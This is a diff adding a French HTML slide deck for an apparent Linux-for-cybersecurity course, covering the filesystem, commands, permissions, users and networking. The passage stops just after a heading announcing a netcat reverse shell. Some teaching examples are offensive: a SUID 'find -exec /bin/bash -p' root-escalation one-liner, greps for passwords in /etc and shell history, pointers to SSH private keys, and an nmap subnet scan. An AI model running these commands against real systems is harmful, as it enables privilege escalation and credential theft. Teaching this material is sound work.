@@ -1,1 +1,898 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Linux pour la Cybersécurité · SooPHA Learn</title>
+<link rel="stylesheet" href="../css/global.css">
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script src="../js/config.js"></script>
+<script src="../js/auth.js"></script>
+<style>
+html, body { overflow: hidden; height: 100%; }
+body::before { height: 3px; }
+#topbar { position:fixed; top:3px; left:0; right:0; z-index:200; display:flex; justify-content:space-between; align-items:center; padding:.5rem 1.5rem; background:rgba(2,8,4,0.97); border-bottom:1px solid rgba(0,255,136,.13); backdrop-filter:blur(12px); font-size:.65rem; color:rgba(0,255,136,.4); }
+.tb-left { display:flex; gap:1.5rem; align-items:center; }
+.tb-right { display:flex; gap:1.2rem; align-items:center; }
+.tb-back { color:rgba(0,255,136,.5); text-decoration:none; font-size:.65rem; letter-spacing:.08em; transition:color .2s; }
+.tb-back:hover { color:#00ff88; }
+.tb-dot { width:6px; height:6px; background:#00ff88; border-radius:50%; display:inline-block; animation:blink 1.4s infinite; margin-right:.3rem; }
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+.tb-user { font-family:var(--mono); font-size:.62rem; color:rgba(0,255,136,.4); }
+#progress-top { position:fixed; top:34px; left:0; right:0; z-index:200; height:2px; background:rgba(0,255,136,.06); }
+#progress-fill { height:100%; background:linear-gradient(90deg,#009e60,#00ff88); box-shadow:0 0 8px #00ff88; transition:width .5s ease; }
+#scanlines { position:fixed; inset:0; z-index:1; pointer-events:none; background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.07) 2px,rgba(0,0,0,.07) 4px); }
+#vignette  { position:fixed; inset:0; z-index:1; pointer-events:none; background:radial-gradient(ellipse at center,transparent 50%,rgba(0,0,0,.65) 100%); }
+canvas#matrix { position:fixed; inset:0; z-index:0; opacity:.04; pointer-events:none; }
+#slides { position:fixed; inset:0; z-index:10; padding-top:36px; padding-bottom:44px; overflow:hidden; }
+.slide { position:absolute; inset:0; display:flex; flex-direction:column; justify-content:center; align-items:center; padding:1.5rem 4rem; opacity:0; pointer-events:none; transition:opacity .4s ease,transform .4s ease; transform:translateX(40px); overflow-y:auto; }
+.slide.active { opacity:1; pointer-events:all; transform:translateX(0); }
+.slide.exit   { opacity:0; transform:translateX(-40px); }
+.gabon-bar { display:flex; height:3px; width:60px; border-radius:2px; overflow:hidden; margin:.6rem 0; }
+.gabon-bar span:nth-child(1){flex:1;background:#009e60}.gabon-bar span:nth-child(2){flex:1;background:#fcd116}.gabon-bar span:nth-child(3){flex:1;background:#003189}
+.slide-tag { font-family:var(--mono); font-size:.6rem; letter-spacing:.3em; color:rgba(0,255,136,.35); text-transform:uppercase; margin-bottom:.5rem; }
+.slide h1 { font-family:var(--display)!important; font-weight:900!important; font-size:clamp(1.8rem,3.5vw,2.8rem)!important; color:#fff!important; text-align:center; letter-spacing:.1em; line-height:1.15; margin-bottom:.4rem!important; }
+.slide h2 { font-family:var(--display)!important; font-weight:700!important; font-size:clamp(1.1rem,2vw,1.7rem)!important; color:#00ff88!important; letter-spacing:.08em; margin-bottom:1rem!important; }
+.slide h3 { font-family:var(--display)!important; font-weight:400!important; font-size:clamp(.8rem,1.2vw,1rem)!important; color:rgba(0,255,136,.55)!important; letter-spacing:.2em; text-transform:uppercase; margin-bottom:1.5rem!important; }
+.card { background:rgba(4,15,8,.88); border:1px solid rgba(0,255,136,.13); border-radius:2px; padding:1.4rem 1.8rem; position:relative; backdrop-filter:blur(10px); max-width:880px; width:100%; }
+.card::before { content:''; position:absolute; top:-1px; left:-1px; width:14px; height:14px; border-top:2px solid #00ff88; border-left:2px solid #00ff88; }
+.card::after  { content:''; position:absolute; bottom:-1px; right:-1px; width:14px; height:14px; border-bottom:2px solid #00ff88; border-right:2px solid #00ff88; }
+.bullets { list-style:none; display:flex; flex-direction:column; gap:.55rem; }
+.bullets li { display:flex; align-items:flex-start; gap:.7rem; font-family:var(--body); font-size:clamp(.8rem,1.3vw,.95rem); color:rgba(200,255,220,.85); line-height:1.5; animation:fadeIn .4s ease both; }
+.bullets li::before { content:'▶'; color:#00ff88; font-size:.55rem; margin-top:.35rem; flex-shrink:0; }
+.bullets li strong { color:#fff; }
+.bullets li.warn::before   { content:'⚠'; color:#ffd700; font-size:.7rem; }
+.bullets li.danger::before { content:'🔴'; font-size:.7rem; }
+.bullets li.ok::before     { content:'✅'; font-size:.7rem; }
+@keyframes fadeIn { from{opacity:0;transform:translateX(8px)} to{opacity:1;transform:translateX(0)} }
+.bullets li:nth-child(1){animation-delay:.05s}.bullets li:nth-child(2){animation-delay:.12s}.bullets li:nth-child(3){animation-delay:.2s}.bullets li:nth-child(4){animation-delay:.28s}.bullets li:nth-child(5){animation-delay:.36s}
+.grid2 { display:grid; grid-template-columns:1fr 1fr; gap:1rem; max-width:880px; width:100%; }
+.pill { display:inline-block; padding:.25rem .7rem; font-size:.65rem; letter-spacing:.06em; border-radius:2px; font-family:var(--mono); }
+.pill-green  { background:rgba(0,255,136,.1);  border:1px solid rgba(0,255,136,.3);  color:#00ff88; }
+.pill-red    { background:rgba(255,68,102,.1); border:1px solid rgba(255,68,102,.3); color:#ff4466; }
+.pill-yellow { background:rgba(255,215,0,.08); border:1px solid rgba(255,215,0,.3);  color:#ffd700; }
+.pill-blue   { background:rgba(0,170,255,.08); border:1px solid rgba(0,170,255,.3);  color:#00aaff; }
+.pill-orange { background:rgba(255,136,0,.1);  border:1px solid rgba(255,136,0,.3);  color:#ff8800; }
+.terminal { background:rgba(0,4,2,.85); border:1px solid rgba(0,255,136,.12); border-left:3px solid #00ff88; padding:.9rem 1.2rem; font-family:var(--mono); font-size:.78rem; color:rgba(0,255,136,.8); line-height:2; max-width:880px; width:100%; }
+.terminal.sm { font-size:.7rem; line-height:1.9; }
+.term-prompt { color:#00ff88; }
+.term-out    { color:rgba(200,255,220,.45); }
+.term-comment { color:rgba(0,255,136,.35); font-style:italic; }
+.term-root { color:#ff4466; }
+.term-path { color:#ffd700; }
+.hdiv { display:flex; align-items:center; gap:1rem; color:rgba(0,255,136,.2); font-size:.62rem; letter-spacing:.2em; margin:.8rem 0; }
+.hdiv::before,.hdiv::after { content:''; flex:1; height:1px; background:rgba(0,255,136,.1); }
+.quote { border-left:3px solid #00ff88; padding:.7rem 1rem; background:rgba(0,255,136,.04); font-family:var(--body); font-style:italic; font-size:clamp(.85rem,1.4vw,1rem); color:#e0ffe8; line-height:1.6; }
+@keyframes glitch {
+  0%,90%,100%{text-shadow:0 0 40px #00ff88,0 0 80px rgba(0,255,136,.2)}
+  91%{text-shadow:-3px 0 #ff0044,3px 0 #00ffff;transform:translate(-2px)}
+  93%{text-shadow:3px 0 #ff0044,-3px 0 #00ffff;transform:translate(2px)}
+  95%{text-shadow:0 0 40px #00ff88;transform:translate(0)}
+}
+.glitch { animation:glitch 7s infinite; }
+/* Filesystem tree */
+.fs-tree { font-family:var(--mono); font-size:.72rem; color:rgba(200,255,220,.75); line-height:1.9; }
+.fs-tree .dir  { color:#00ff88; }
+.fs-tree .file { color:rgba(200,255,220,.5); }
+.fs-tree .imp  { color:#ffd700; font-weight:700; }
+/* Permission grid */
+.perm-row { display:flex; align-items:center; gap:.6rem; padding:.4rem .7rem; border:1px solid rgba(0,255,136,.08); background:rgba(0,255,136,.02); margin-bottom:.3rem; font-family:var(--mono); font-size:.72rem; }
+.perm-code { color:#00ff88; min-width:80px; font-weight:700; }
+.perm-who  { color:rgba(255,215,0,.7); min-width:120px; }
+.perm-desc { color:rgba(200,255,220,.55); }
+/* Command cards */
+.cmd-grid { display:grid; grid-template-columns:repeat(2,1fr); gap:.5rem; max-width:880px; width:100%; }
+.cmd-card { padding:.7rem .9rem; border:1px solid rgba(0,255,136,.1); background:rgba(0,255,136,.03); }
+.cmd-name { font-family:var(--mono); font-size:.78rem; color:#00ff88; margin-bottom:.25rem; }
+.cmd-desc { font-family:var(--body); font-size:.72rem; color:rgba(200,255,220,.6); line-height:1.4; }
+.cmd-ex   { font-family:var(--mono); font-size:.65rem; color:rgba(0,255,136,.35); margin-top:.3rem; }
+/* Step */
+.step { display:flex; align-items:flex-start; gap:.8rem; padding:.7rem 1rem; border:1px solid rgba(0,255,136,.1); background:rgba(0,255,136,.03); }
+.step-num { font-family:var(--display); font-size:1rem; font-weight:900; color:#00ff88; text-shadow:0 0 8px #00ff88; min-width:24px; }
+.step-content { font-family:var(--body); font-size:.83rem; color:rgba(200,255,220,.85); line-height:1.5; }
+/* QCM */
+#qcm-overlay { position:fixed; inset:0; z-index:300; background:rgba(2,8,4,.97); display:none; flex-direction:column; align-items:center; justify-content:center; padding:2rem; }
+#qcm-overlay.show { display:flex; animation:fadeInOv .3s ease; }
+@keyframes fadeInOv { from{opacity:0} to{opacity:1} }
+.qcm-box { max-width:680px; width:100%; background:rgba(4,15,8,.97); border:1px solid rgba(0,255,136,.25); border-radius:2px; padding:2.5rem; position:relative; box-shadow:0 0 40px rgba(0,255,136,.1); }
+.qcm-box::before { content:''; position:absolute; top:-1px; left:-1px; width:18px; height:18px; border-top:2px solid #00ff88; border-left:2px solid #00ff88; }
+.qcm-box::after  { content:''; position:absolute; bottom:-1px; right:-1px; width:18px; height:18px; border-bottom:2px solid #00ff88; border-right:2px solid #00ff88; }
+.qcm-header { display:flex; align-items:center; justify-content:space-between; margin-bottom:1.5rem; padding-bottom:1rem; border-bottom:1px solid rgba(0,255,136,.12); }
+.qcm-label { font-family:var(--mono); font-size:.6rem; letter-spacing:.3em; color:rgba(0,255,136,.4); text-transform:uppercase; }
+.qcm-prog  { font-family:var(--mono); font-size:.65rem; color:rgba(0,255,136,.35); }
+.qcm-saving { font-family:var(--mono); font-size:.62rem; color:rgba(0,255,136,.35); margin-bottom:.5rem; display:none; }
+.qcm-saving.show { display:block; }
+.qcm-question { font-family:var(--display); font-size:clamp(.9rem,1.8vw,1.1rem); font-weight:700; color:#fff; line-height:1.4; margin-bottom:1.8rem; }
+.qcm-options { display:flex; flex-direction:column; gap:.65rem; margin-bottom:1.5rem; }
+.qcm-option { display:flex; align-items:flex-start; gap:.9rem; padding:.8rem 1.1rem; background:rgba(0,0,0,.3); border:1px solid rgba(0,255,136,.1); cursor:pointer; border-radius:2px; transition:all .15s; font-family:var(--body); font-size:.88rem; color:rgba(200,255,220,.75); line-height:1.4; }
+.qcm-option:hover:not(.disabled) { border-color:rgba(0,255,136,.35); background:rgba(0,255,136,.06); color:rgba(200,255,220,.95); }
+.qcm-option.correct  { border-color:#00ff88!important; background:rgba(0,255,136,.12)!important; color:#00ff88!important; }
+.qcm-option.wrong    { border-color:#ff4466!important; background:rgba(255,68,102,.08)!important; color:#ff4466!important; }
+.qcm-option.disabled { cursor:default; pointer-events:none; }
+.option-letter { font-family:var(--display); font-size:.68rem; font-weight:700; color:rgba(0,255,136,.4); min-width:18px; flex-shrink:0; margin-top:.1rem; }
+.qcm-option.correct .option-letter,.qcm-option.wrong .option-letter { color:inherit; }
+.qcm-feedback { padding:.8rem 1rem; border-radius:2px; font-family:var(--mono); font-size:.8rem; line-height:1.5; display:none; margin-bottom:1.2rem; }
+.qcm-feedback.correct { background:rgba(0,255,136,.07); border:1px solid rgba(0,255,136,.2); color:rgba(0,255,136,.9); }
+.qcm-feedback.wrong   { background:rgba(255,68,102,.06); border:1px solid rgba(255,68,102,.2); color:rgba(255,100,130,.9); }
+.qcm-btn { font-family:var(--display); font-size:.75rem; font-weight:700; letter-spacing:.12em; padding:.7rem 1.8rem; background:#00ff88; color:#020c06; border:none; cursor:pointer; clip-path:polygon(6px 0%,100% 0%,calc(100% - 6px) 100%,0% 100%); transition:all .2s; text-transform:uppercase; display:none; }
+.qcm-btn.show { display:inline-block; }
+#completion-modal { position:fixed; inset:0; z-index:400; background:rgba(0,0,0,.9); display:none; align-items:center; justify-content:center; padding:2rem; }
+#completion-modal.show { display:flex; animation:fadeInOv .3s ease; }
+.completion-box { max-width:500px; width:100%; background:rgba(4,15,8,.98); border:1px solid rgba(0,255,136,.3); border-radius:2px; padding:3rem 2.5rem; text-align:center; box-shadow:0 0 60px rgba(0,255,136,.15); position:relative; }
+.completion-box::before { content:''; position:absolute; top:-1px; left:-1px; width:20px; height:20px; border-top:2px solid #00ff88; border-left:2px solid #00ff88; }
+.completion-icon  { font-size:4rem; margin-bottom:1rem; }
+.completion-title { font-family:var(--display); font-size:1.5rem; font-weight:900; color:#fff; margin-bottom:.5rem; }
+.completion-score { font-family:var(--display); font-size:3.5rem; font-weight:900; color:#00ff88; text-shadow:0 0 30px #00ff88; margin:1rem 0; }
+.completion-sub   { font-family:var(--mono); font-size:.78rem; color:rgba(0,255,136,.5); margin-bottom:.5rem; line-height:1.6; }
+.completion-saved { font-family:var(--mono); font-size:.68rem; color:rgba(0,255,136,.35); margin-bottom:1.5rem; }
+.completion-btn { font-family:var(--display); font-size:.78rem; font-weight:700; letter-spacing:.12em; padding:.8rem 1.8rem; text-decoration:none; display:inline-block; clip-path:polygon(8px 0%,100% 0%,calc(100% - 8px) 100%,0% 100%); cursor:pointer; border:none; margin:.3rem; text-transform:uppercase; transition:all .2s; }
+.completion-btn-primary   { background:#00ff88; color:#020c06; }
+.completion-btn-secondary { background:transparent; color:#00ff88; border:1px solid rgba(0,255,136,.3)!important; clip-path:none; border-radius:2px; }
+#bottombar { position:fixed; bottom:0; left:0; right:0; z-index:200; display:flex; justify-content:space-between; align-items:center; padding:.5rem 1.5rem; background:rgba(2,8,4,.97); border-top:1px solid rgba(0,255,136,.1); backdrop-filter:blur(12px); }
+.nav-btn { background:transparent; border:1px solid rgba(0,255,136,.2); color:rgba(0,255,136,.55); padding:.32rem .9rem; font-family:var(--mono); font-size:.65rem; cursor:pointer; transition:all .2s; clip-path:polygon(5px 0%,100% 0%,calc(100% - 5px) 100%,0% 100%); }
+.nav-btn:hover { border-color:#00ff88; color:#00ff88; background:rgba(0,255,136,.05); }
+.nav-btn:disabled { opacity:.2; cursor:not-allowed; }
+#slide-counter { font-family:var(--display); font-size:.72rem; color:#00ff88; }
+.qcm-indicator { font-family:var(--mono); font-size:.62rem; color:rgba(255,215,0,.5); letter-spacing:.08em; }
+@media (max-width:768px) { .slide{padding:1rem 1.2rem;} .grid2{grid-template-columns:1fr;} .cmd-grid{grid-template-columns:1fr;} }
+</style>
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div id="scanlines"></div>
+<div id="vignette"></div>
 
+<div id="topbar">
+  <div class="tb-left">
+    <a href="dashboard.html" class="tb-back">← Dashboard</a>
+    <span>Linux pour la Cybersécurité</span>
+  </div>
+  <div class="tb-right">
+    <span class="tb-user" id="tb-username"></span>
+    <span><span class="tb-dot"></span>SooPHA Learn</span>
+  </div>
+</div>
+<div id="progress-top"><div id="progress-fill" style="width:0%"></div></div>
+
+<div id="slides">
+
+<!-- SLIDE 0 · COVER -->
+<div class="slide active" data-index="0">
+  <div class="slide-tag">// Linux · Cybersécurité · Afrique Francophone</div>
+  <h1 class="glitch">MAÎTRISE<br>LINUX</h1>
+  <div class="gabon-bar"><span></span><span></span><span></span></div>
+  <h3>Commandes · Permissions · Réseau · Hardening · Scripts</h3>
+  <div style="display:flex;gap:.7rem;flex-wrap:wrap;justify-content:center;margin-top:.8rem">
+    <span class="pill pill-green">🐧 Architecture</span>
+    <span class="pill pill-yellow">🔐 Permissions</span>
+    <span class="pill pill-blue">🌐 Réseau</span>
+    <span class="pill pill-orange">📋 Logs</span>
+    <span class="pill pill-red">🛡️ Hardening</span>
+    <span class="pill" style="background:rgba(170,68,255,.1);border:1px solid rgba(170,68,255,.3);color:#aa44ff">⚡ Bash</span>
+  </div>
+  <div style="margin-top:1.5rem" class="terminal">
+    <span class="term-root">root@soopha:~# </span>
+    <span class="term-out">// "En cybersécurité, Linux n'est pas une option. C'est la fondation."</span>
+  </div>
+  <div style="margin-top:1.5rem;font-size:.68rem;color:rgba(0,255,136,.2);letter-spacing:.15em">← → POUR NAVIGUER &nbsp;|&nbsp; ESPACE POUR AVANCER</div>
+</div>
+
+<!-- SLIDE 1 · POURQUOI LINUX -->
+<div class="slide" data-index="1">
+  <div class="slide-tag">// 00 · Pourquoi Linux ?</div>
+  <h2>Linux — Le terrain de la cybersécurité</h2>
+  <div class="grid2">
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(0,255,136,.4);margin-bottom:.7rem">🌍 PARTOUT, TOUT LE TEMPS</div>
+      <ul class="bullets">
+        <li><strong>90%+ des serveurs web</strong> tournent sous Linux (Apache, Nginx)</li>
+        <li><strong>100% des supercalculateurs</strong> du TOP500 mondial</li>
+        <li><strong>Android</strong> est basé sur le noyau Linux</li>
+        <li>Les <strong>équipements réseau</strong> (Cisco, Juniper) tournent sous Linux</li>
+        <li>Les <strong>services cloud</strong> AWS, Azure, GCP utilisent Linux</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(255,68,102,.4);margin-bottom:.7rem">⚔️ POUR LA CYBER SPÉCIFIQUEMENT</div>
+      <ul class="bullets">
+        <li><strong>Kali Linux</strong> — la distro officielle du pentester</li>
+        <li>Les <strong>outils cyber</strong> sont natifs Linux (Nmap, Wireshark, Metasploit)</li>
+        <li>Les <strong>serveurs cibles</strong> à auditer sont sous Linux</li>
+        <li><strong>Bash scripting</strong> — automatiser les tâches de reconnaissance</li>
+        <li>La plupart des <strong>CTF</strong> nécessitent Linux</li>
+      </ul>
+      <div style="margin-top:.8rem;padding:.5rem .8rem;background:rgba(0,255,136,.04);border-left:2px solid #00ff88;font-family:var(--body);font-size:.75rem;color:rgba(200,255,220,.6)">
+        💡 Tu peux apprendre Linux <strong style="color:#fff">gratuitement</strong> : WSL sur Windows, TryHackMe, VMs VirtualBox.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 2 · ARCHITECTURE LINUX — QCM 2 -->
+<div class="slide" data-index="2" data-qcm="2">
+  <div class="slide-tag">// 01 · Architecture</div>
+  <h2>Architecture & Arborescence Linux</h2>
+  <div class="grid2">
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(0,255,136,.4);margin-bottom:.7rem">📂 L'ARBORESCENCE — TOUT PART DE /</div>
+      <div class="fs-tree">
+        <div><span class="dir">/</span> &nbsp;<span style="color:rgba(0,255,136,.3);font-size:.62rem">← racine du système</span></div>
+        <div>├── <span class="dir imp">/etc</span> &nbsp;<span class="file">← configs système (passwd, ssh, cron)</span></div>
+        <div>├── <span class="dir imp">/var/log</span> &nbsp;<span class="file">← tous les logs</span></div>
+        <div>├── <span class="dir imp">/tmp</span> &nbsp;<span class="file">← temporaire, souvent exploité</span></div>
+        <div>├── <span class="dir imp">/home</span> &nbsp;<span class="file">← dossiers utilisateurs</span></div>
+        <div>├── <span class="dir imp">/root</span> &nbsp;<span class="file">← home du superuser root</span></div>
+        <div>├── <span class="dir">/bin</span> &nbsp;<span class="file">← commandes essentielles</span></div>
+        <div>├── <span class="dir">/usr/bin</span> &nbsp;<span class="file">← programmes installés</span></div>
+        <div>├── <span class="dir imp">/proc</span> &nbsp;<span class="file">← processus en cours (virtuel)</span></div>
+        <div>└── <span class="dir imp">/dev</span> &nbsp;<span class="file">← périphériques (disques, terminaux)</span></div>
+      </div>
+    </div>
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(255,215,0,.4);margin-bottom:.7rem">🔑 FICHIERS CRITIQUES À CONNAÎTRE</div>
+      <div style="display:flex;flex-direction:column;gap:.35rem">
+        <div class="perm-row"><span class="perm-code">/etc/passwd</span><span class="perm-desc" style="color:rgba(255,215,0,.7)">Liste de tous les utilisateurs</span></div>
+        <div class="perm-row"><span class="perm-code">/etc/shadow</span><span class="perm-desc" style="color:#ff4466">Mots de passe hashés (root only)</span></div>
+        <div class="perm-row"><span class="perm-code">/etc/sudoers</span><span class="perm-desc" style="color:rgba(255,215,0,.7)">Qui peut faire sudo ?</span></div>
+        <div class="perm-row"><span class="perm-code">/etc/crontab</span><span class="perm-desc">Tâches planifiées automatiques</span></div>
+        <div class="perm-row"><span class="perm-code">/etc/hosts</span><span class="perm-desc">Résolution DNS locale</span></div>
+        <div class="perm-row"><span class="perm-code">~/.bash_history</span><span class="perm-desc" style="color:#ff4466">Historique des commandes !</span></div>
+        <div class="perm-row"><span class="perm-code">~/.ssh/</span><span class="perm-desc" style="color:#ff4466">Clés SSH privées (trésor)</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 3 · COMMANDES ESSENTIELLES — QCM 3 -->
+<div class="slide" data-index="3" data-qcm="3">
+  <div class="slide-tag">// 02 · Navigation & Fichiers</div>
+  <h2>Les commandes fondamentales</h2>
+  <div class="cmd-grid">
+    <div class="cmd-card">
+      <div class="cmd-name">ls -la</div>
+      <div class="cmd-desc">Lister tous les fichiers, y compris <strong>cachés</strong> (commençant par .) avec permissions</div>
+      <div class="cmd-ex">$ ls -la /etc/ → voir configs + droits</div>
+    </div>
+    <div class="cmd-card">
+      <div class="cmd-name">cat / less / tail</div>
+      <div class="cmd-desc">Lire le contenu d'un fichier. <strong>tail -f</strong> pour suivre un log en temps réel</div>
+      <div class="cmd-ex">$ tail -f /var/log/auth.log</div>
+    </div>
+    <div class="cmd-card">
+      <div class="cmd-name">find</div>
+      <div class="cmd-desc">Chercher des fichiers par nom, taille, permissions, date. Indispensable en forensics et pentest</div>
+      <div class="cmd-ex">$ find / -perm -4000 2>/dev/null</div>
+    </div>
+    <div class="cmd-card">
+      <div class="cmd-name">grep</div>
+      <div class="cmd-desc">Chercher un pattern dans un fichier ou flux. <strong>-r</strong> récursif, <strong>-i</strong> insensible à la casse</div>
+      <div class="cmd-ex">$ grep -r "password" /etc/</div>
+    </div>
+    <div class="cmd-card">
+      <div class="cmd-name">chmod / chown</div>
+      <div class="cmd-desc">Modifier permissions et propriétaire d'un fichier. Critique pour l'escalade de privilèges</div>
+      <div class="cmd-ex">$ chmod 600 ~/.ssh/id_rsa</div>
+    </div>
+    <div class="cmd-card">
+      <div class="cmd-name">ps / top / htop</div>
+      <div class="cmd-desc">Voir les processus en cours. Détecter des processus malveillants ou inattendus</div>
+      <div class="cmd-ex">$ ps aux | grep suspicious</div>
+    </div>
+    <div class="cmd-card">
+      <div class="cmd-name">history</div>
+      <div class="cmd-desc">Afficher les commandes précédentes. En forensics : <strong>mine d'or</strong> sur une machine compromise</div>
+      <div class="cmd-ex">$ cat ~/.bash_history | grep pass</div>
+    </div>
+    <div class="cmd-card">
+      <div class="cmd-name">sudo / su</div>
+      <div class="cmd-desc">Exécuter en tant que root. <strong>sudo -l</strong> : voir ce qu'on peut faire → escalade de privilèges</div>
+      <div class="cmd-ex">$ sudo -l → GTFOBins exploitation</div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 4 · PERMISSIONS — QCM 4 -->
+<div class="slide" data-index="4" data-qcm="4">
+  <div class="slide-tag">// 03 · Permissions</div>
+  <h2>Le système de permissions Linux</h2>
+  <div class="grid2">
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(0,255,136,.4);margin-bottom:.7rem">LIRE UNE PERMISSION</div>
+      <div class="terminal sm" style="margin-bottom:.8rem">
+        <span class="term-prompt">$ </span>ls -la /etc/passwd<br>
+        <span style="color:#ffd700">-rw-r--r--</span> <span class="term-out">1 root root 2847 jan 15 /etc/passwd</span><br><br>
+        <span class="term-comment"># Décomposition :</span><br>
+        <span style="color:#ff4466">-</span><span style="color:#00ff88">rw-</span><span style="color:#ffd700">r--</span><span style="color:#00aaff">r--</span><br>
+        <span class="term-comment"># type | proprio | groupe | autres</span>
+      </div>
+      <div style="display:flex;flex-direction:column;gap:.3rem;font-family:var(--mono);font-size:.7rem">
+        <div><span style="color:#00ff88;font-weight:700">r = 4</span> <span class="term-out">— lire (read)</span></div>
+        <div><span style="color:#ffd700;font-weight:700">w = 2</span> <span class="term-out">— écrire (write)</span></div>
+        <div><span style="color:#ff8800;font-weight:700">x = 1</span> <span class="term-out">— exécuter (execute)</span></div>
+        <div style="margin-top:.4rem"><span style="color:#00ff88">rwx = 7</span> &nbsp;<span style="color:#ffd700">rw- = 6</span> &nbsp;<span style="color:#ff8800">r-- = 4</span></div>
+      </div>
+    </div>
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(255,68,102,.4);margin-bottom:.7rem">⚔️ SUID — LE PIÈGE DES PENTESTERS</div>
+      <div class="quote" style="margin-bottom:.8rem;font-size:.8rem">Un fichier avec le bit <strong style="color:#ff4466">SUID (s)</strong> s'exécute avec les droits de son propriétaire — souvent root. C'est une voie royale pour l'<strong style="color:#ff4466">escalade de privilèges</strong>.</div>
+      <div class="terminal sm">
+        <span class="term-comment"># Trouver tous les SUID</span><br>
+        <span class="term-prompt">$ </span>find / -perm -4000 2>/dev/null<br><br>
+        <span class="term-comment"># Exemple dangereux</span><br>
+        <span style="color:#ffd700">-rwsr-xr-x</span> <span class="term-out">root root /usr/bin/find</span><br>
+        <span class="term-comment"># → find a le SUID → GTFOBins!</span><br><br>
+        <span class="term-prompt">$ </span>find . -exec /bin/bash -p \; <span class="term-comment"># root!</span>
+      </div>
+      <div style="margin-top:.7rem;font-family:var(--body);font-size:.73rem;color:rgba(200,255,220,.6)">💡 GTFOBins.github.io — référence de toutes les escalades via SUID</div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 5 · UTILISATEURS & GROUPES — QCM 5 -->
+<div class="slide" data-index="5" data-qcm="5">
+  <div class="slide-tag">// 04 · Utilisateurs</div>
+  <h2>Gestion des utilisateurs & groupes</h2>
+  <div class="grid2">
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(0,255,136,.4);margin-bottom:.7rem">👤 COMMANDES UTILISATEURS</div>
+      <div class="terminal sm">
+        <span class="term-comment"># Voir tous les utilisateurs</span><br>
+        <span class="term-prompt">$ </span>cat /etc/passwd<br><br>
+        <span class="term-comment"># Qui suis-je ?</span><br>
+        <span class="term-prompt">$ </span>whoami &amp;&amp; id<br><br>
+        <span class="term-comment"># Créer un utilisateur</span><br>
+        <span class="term-root">root@soopha# </span>useradd -m -s /bin/bash beni<br><span class="term-root">root@soopha# </span>passwd beni<br><br>
+        <span class="term-comment"># Ajouter au groupe sudo</span><br>
+        <span class="term-root">root@soopha# </span>usermod -aG sudo beni<br><br>
+        <span class="term-comment"># Voir les connexions actives</span><br>
+        <span class="term-prompt">$ </span>who &amp;&amp; last | head -20
+      </div>
+    </div>
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(255,215,0,.4);margin-bottom:.7rem">🔑 /etc/passwd — DÉCODER LA STRUCTURE</div>
+      <div class="terminal sm" style="margin-bottom:.8rem">
+        <span class="term-comment"># Format : user:x:uid:gid:info:home:shell</span><br>
+        <span style="color:#00ff88">root</span><span class="term-out">:x:0:0:root:/root:/bin/bash</span><br>
+        <span style="color:#00ff88">beni</span><span class="term-out">:x:1001:1001::/home/beni:/bin/bash</span><br>
+        <span style="color:#ffd700">www-data</span><span class="term-out">:x:33:33::/var/www:/usr/sbin/nologin</span>
+      </div>
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(255,68,102,.4);margin-bottom:.5rem">⚠️ COMPTES À RISQUE</div>
+      <ul class="bullets" style="font-size:.82rem">
+        <li>Comptes avec <strong>UID 0</strong> = root, très dangereux si multiples</li>
+        <li>Shell <strong>/bin/bash</strong> sur comptes de service = risque</li>
+        <li><strong>/etc/shadow</strong> — si lisible par un user normal → grave</li>
+        <li>Comptes <strong>sans mot de passe</strong> dans /etc/shadow</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 6 · RÉSEAU SOUS LINUX — QCM 6 -->
+<div class="slide" data-index="6" data-qcm="6">
+  <div class="slide-tag">// 05 · Réseau</div>
+  <h2>Réseau sous Linux — Commandes essentielles</h2>
+  <div class="grid2">
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(0,170,255,.4);margin-bottom:.7rem">🌐 DIAGNOSTIC RÉSEAU</div>
+      <div class="terminal sm">
+        <span class="term-comment"># Voir mes interfaces et IPs</span><br>
+        <span class="term-prompt">$ </span>ip a &nbsp;&nbsp;&nbsp;<span class="term-comment"># moderne</span><br>
+        <span class="term-prompt">$ </span>ifconfig &nbsp;<span class="term-comment"># ancien</span><br><br>
+        <span class="term-comment"># Connexions actives — qui écoute quoi</span><br>
+        <span class="term-prompt">$ </span>ss -tulnp<br>
+        <span class="term-prompt">$ </span>netstat -tulnp &nbsp;<span class="term-comment"># ancien</span><br><br>
+        <span class="term-comment"># Table de routage</span><br>
+        <span class="term-prompt">$ </span>ip route<br><br>
+        <span class="term-comment"># DNS — résolution</span><br>
+        <span class="term-prompt">$ </span>cat /etc/resolv.conf<br>
+        <span class="term-prompt">$ </span>nslookup soopha-learn.com<br><br>
+        <span class="term-comment"># Tracer le chemin vers un hôte</span><br>
+        <span class="term-prompt">$ </span>traceroute google.com
+      </div>
+    </div>
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(255,68,102,.4);margin-bottom:.7rem">⚔️ COMMANDES OFFENSIVES</div>
+      <div class="terminal sm" style="margin-bottom:.8rem">
+        <span class="term-comment"># Scanner un réseau (Nmap)</span><br>
+        <span class="term-prompt">$ </span>nmap -sV 192.168.1.0/24<br><br>
+        <span class="term-comment"># Connexion netcat (reverse shell)</span><br>
